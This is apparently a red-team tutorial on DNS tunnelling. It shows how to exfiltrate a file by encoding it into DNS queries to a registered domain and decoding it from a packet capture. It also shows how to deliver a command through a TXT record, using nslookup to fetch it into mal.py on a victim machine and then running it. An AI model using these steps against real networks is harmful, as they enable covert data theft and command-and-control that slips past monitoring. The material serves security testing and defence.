# DNS Exfil/Infil/Tunneling

**Description**
This falls more under Red Team/Purple Team activities to determine if your company is vulnerable to these types of attacks. DNS is commonly allowed in most organizations and attackers abuse this fact to use it in a malicious manner
## DNS Exfil
1. To start, grab the scripts found here:  https://github.com/kleosdc/dns-exfil-infil 
2. CD into the directory then do: pip3 install -r requirements.txt

In this directory you will see a file called securecorp.txt  https://github.com/kleosdc/dns-exfil-infil/blob/main/securecorp.txt
This will be the file we want to exfil out. Next you would need to register a domain, so that the DNS can be used. For me I created one with GoogleDomains, let's say its called wingnut.com. 

First let's run this command from the script in that directory:
```
python3 packety.py
```
1. This will first ask for a name of a file, in this case it will be the securecorp.txt one. 
2. Next it will ask for a domain, here I put wingnut.com. What the script will do is Base58 encode it then Base64 encode it. This is so it can fit in the domain name portion of the DNS request we will send. 
3. It will ask you if you want to start, and you can hit enter. (If you want to monitor the traffic to see what the requests look like, you can use something like tshark. I made an empty file called secret-credit-cards.pcap, did a chmod 666 on it then ran tshark -i eth0 -w secret-credit-cards.pcap)
4. After you hit enter it will take a minute or so and show a progress. Once it has completed, you can review the traffic you caught in tshark if you used it to monitor the traffic.


A little background on what is going to happen with these scripts: The code starts off by reading from the text file. The text file's content will first be Base64 encoded and then Base58 encoded. This leaves us with a long encoded string. The string is then split into 20 character long sections where each section will have 3 'dummy' characters added to it for further obfuscation. One character will be prepended to the encoded string and two characters will be appended. For example, a section of the encoded data might look like this: '6gfghhjywsas3rg4hda3'. After the extra characters are added it will end up being 'x6gfghhjywsas3rg4hda3yu'.
Once everything is done, then we need to decode it and fortunately he has a script for that as well. Back in the terminal where you ran the packety.py script type:
```
python3 packetyGrabber.py
```
1. This will ask for a file name, you put in the pcap filename. 
2. Next it will ask you for a filename to save it as, we will call it goodies.txt
3. lastly it will ask you for the domain you used, which in our case was wingnut.com

The script will then Base58 Decode it, then Base64 Decode it. You will now have the goodies.txt file to look at and it should contain all the content that was in the securecorp.txt file. You have successfully exfiltrated the data using DNS


## Data Infiltration
We want to simulate a C2-like activity of sending an encoded command to run on a victim machine. The scenario here would be that the attacker has compromised a victim machine, and has a domain/dns that has encoded commands they want to be sent to this machine without being caught as normal C2 traffic would. 
First you want to create a domain, I would recommend using Google Domains to register a new domain. For this example, we will use wingnut.com. We are still in the directory of the github project we used in the above example as well. In this example our "malicious" command will be:

```
import os; print(os.uname()[2])
```
Log into your Google Domains and manage the DNS for wingnut.com. Make a new Custom Record of type TXT, and give it a name of badstuff. Next give it a value of 
YeeTbunLbACdXq193g6VHXRuDQ9Y1upaAzA3UkpCr8yBBE68JEXU32wxNE44
This is a Base58/Base64 encoded version of that "malicious" command. Save it then to test it bring up command prompt and type:

```
nslookup -type=txt badstuff.wingnut.com
```
You should see that long encoded value. So on the victim machine in the directory of the github we have been using, do this command:

```
nslookup -type=txt badstuff.wingnut.com | grep Ye | cut -d \" -f2 > mal.py
```
This should pull that string value and put it in a file called mal.py. Next we run the script:

```
python3 packetySimple.py 
```
1. First it asks for the filename
2. Put in mal.py and hit enter

This will do the proper decode, and now you should be able to run

```
python3 mal.py
```
and it should run that OS command





